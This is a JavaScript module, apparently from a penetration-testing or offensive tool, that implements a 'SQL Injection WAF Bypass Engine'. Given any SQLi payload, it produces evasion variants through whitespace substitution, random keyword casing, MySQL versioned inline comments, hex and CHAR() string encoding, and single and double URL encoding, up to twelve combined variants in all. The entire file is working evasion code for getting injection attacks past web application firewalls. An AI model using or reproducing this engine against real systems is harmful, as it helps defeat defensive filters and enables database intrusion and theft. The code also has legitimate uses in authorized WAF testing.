/**
 * SQL Injection WAF Bypass Engine
 * Generates multiple evasion variants for SQLi payloads.
 * Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
 */

import { urlEncode, doubleUrlEncode, toSqlHex, randomCase } from '../utils/encoding'
import { splitSqlKeywords, extractQuotedStrings, randomMysqlVersion, pickOne, shuffle } from '../utils/helpers'

/* ── Whitespace replacements ──────────────────────── */
const WHITESPACE_ALTERNATIVES = ['/**/', '%09', '%0a', '%0d', '%0b', '%0c', '%a0', '+']

function applyWhitespace(payload) {
  const variants = []
  // /**/ variant
  variants.push(payload.replace(/ /g, '/**/'))
  // %09 (tab) variant
  variants.push(payload.replace(/ /g, '%09'))
  // %0a (newline) variant
  variants.push(payload.replace(/ /g, '%0a'))
  // Mixed whitespace
  variants.push(payload.replace(/ /g, () => pickOne(WHITESPACE_ALTERNATIVES)))
  // + variant (common in URL params)
  variants.push(payload.replace(/ /g, '+'))
  return variants
}

/* ── Case toggling ────────────────────────────────── */
function applyCaseToggle(payload) {
  const variants = []
  for (let i = 0; i < 3; i++) {
    const tokens = splitSqlKeywords(payload)
    const result = tokens.map(t => t.type === 'keyword' ? randomCase(t.value) : t.value).join('')
    variants.push(result)
  }
  return variants
}

/* ── Inline MySQL comments ────────────────────────── */
function applyInlineComments(payload, target) {
  if (target !== 'mysql' && target !== 'mssql') {
    // Inline comments are MySQL/MariaDB specific; for others, use basic /**/
    const tokens = splitSqlKeywords(payload)
    const v1 = tokens.map(t => t.type === 'keyword' ? `/*${t.value}*/` : t.value).join('')
    return [v1]
  }

  const variants = []
  // /*!50000KEYWORD*/
  const tokens = splitSqlKeywords(payload)
  const v1 = tokens.map(t => {
    if (t.type === 'keyword') return `/*!${randomMysqlVersion()}${t.value}*/`
    return t.value
  }).join('')
  variants.push(v1)

  // Mix: some keywords wrapped, some not
  const v2 = tokens.map(t => {
    if (t.type === 'keyword' && Math.random() > 0.4) return `/*!${randomMysqlVersion()}${t.value}*/`
    return t.value
  }).join('')
  variants.push(v2)

  // Nested comment style
  const v3 = tokens.map(t => {
    if (t.type === 'keyword') return `/*!${t.value}*/`
    return t.value
  }).join('')
  variants.push(v3)

  return variants
}

/* ── Hex encoding of strings ─────────────────────── */
function applyHexEncoding(payload) {
  const variants = []
  const strings = extractQuotedStrings(payload)

  if (strings.length === 0) {
    // No quoted strings, hex-encode the whole thing except structure
    variants.push(payload)
    return variants
  }

  // Replace each quoted string with hex
  let hexPayload = payload
  for (const s of strings) {
    hexPayload = hexPayload.replace(s.full, toSqlHex(s.content))
  }
  variants.push(hexPayload)

  // CHAR() encoding
  let charPayload = payload
  for (const s of strings) {
    const chars = Array.from(s.content).map(c => c.charCodeAt(0)).join(',')
    charPayload = charPayload.replace(s.full, `CHAR(${chars})`)
  }
  variants.push(charPayload)

  // CONCAT(CHAR()) encoding
  let concatPayload = payload
  for (const s of strings) {
    const chars = Array.from(s.content).map(c => `CHAR(${c.charCodeAt(0)})`).join(',')
    concatPayload = concatPayload.replace(s.full, `CONCAT(${chars})`)
  }
  variants.push(concatPayload)

  return variants
}

/* ── URL encoding of keywords ────────────────────── */
function applyUrlEncoding(payload) {
  const variants = []
  // Full URL encode
  variants.push(urlEncode(payload))
  // Only encode keywords
  const tokens = splitSqlKeywords(payload)
  const v2 = tokens.map(t => t.type === 'keyword' ? urlEncode(t.value) : t.value).join('')
  variants.push(v2)
  return variants
}

/* ── Double URL encoding ─────────────────────────── */
function applyDoubleUrl(payload) {
  const variants = []
  variants.push(doubleUrlEncode(payload))
  // Partial double encode - only keywords
  const tokens = splitSqlKeywords(payload)
  const v2 = tokens.map(t => t.type === 'keyword' ? doubleUrlEncode(t.value) : t.value).join('')
  variants.push(v2)
  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateSqliVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []

  // Always include original
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('whitespace')) {
    applyWhitespace(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Whitespace Bypass', layers: ['whitespace'] })
    })
  }

  if (layers.includes('case-toggle')) {
    applyCaseToggle(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Case Toggle', layers: ['case-toggle'] })
    })
  }

  if (layers.includes('inline-comments')) {
    applyInlineComments(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Inline Comments', layers: ['inline-comments'] })
    })
  }

  if (layers.includes('hex-encoding')) {
    applyHexEncoding(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Hex Encoding', layers: ['hex-encoding'] })
    })
  }

  if (layers.includes('url-encoding')) {
    applyUrlEncoding(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'URL Encoding', layers: ['url-encoding'] })
    })
  }

  if (layers.includes('double-url')) {
    applyDoubleUrl(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Double URL', layers: ['double-url'] })
    })
  }

  // Generate combo variants (mix multiple layers)
  if (layers.length >= 2) {
    // Whitespace + Case toggle
    if (layers.includes('whitespace') && layers.includes('case-toggle')) {
      const ws = payload.replace(/ /g, '/**/')
      const tokens = splitSqlKeywords(ws)
      const combo = tokens.map(t => t.type === 'keyword' ? randomCase(t.value) : t.value).join('')
      allVariants.push({ payload: combo, label: 'Whitespace + Case', layers: ['whitespace', 'case-toggle'] })
    }

    // Inline comments + Case toggle
    if (layers.includes('inline-comments') && layers.includes('case-toggle')) {
      const tokens = splitSqlKeywords(payload)
      const combo = tokens.map(t => {
        if (t.type === 'keyword') return `/*!${randomMysqlVersion()}${randomCase(t.value)}*/`
        return t.value
      }).join('')
      allVariants.push({ payload: combo, label: 'Comments + Case', layers: ['inline-comments', 'case-toggle'] })
    }

    // Whitespace + Hex
    if (layers.includes('whitespace') && layers.includes('hex-encoding')) {
      let combo = payload.replace(/ /g, '/**/')
      const strings = extractQuotedStrings(combo)
      for (const s of strings) {
        combo = combo.replace(s.full, toSqlHex(s.content))
      }
      allVariants.push({ payload: combo, label: 'Whitespace + Hex', layers: ['whitespace', 'hex-encoding'] })
    }

    // Case + URL encoding
    if (layers.includes('case-toggle') && layers.includes('url-encoding')) {
      const tokens = splitSqlKeywords(payload)
      const cased = tokens.map(t => t.type === 'keyword' ? randomCase(t.value) : t.value).join('')
      const urlTokens = splitSqlKeywords(cased)
      const combo = urlTokens.map(t => t.type === 'keyword' ? urlEncode(t.value) : t.value).join('')
      allVariants.push({ payload: combo, label: 'Case + URL', layers: ['case-toggle', 'url-encoding'] })
    }
  }

  // Remove the original from variants (keep it first), deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
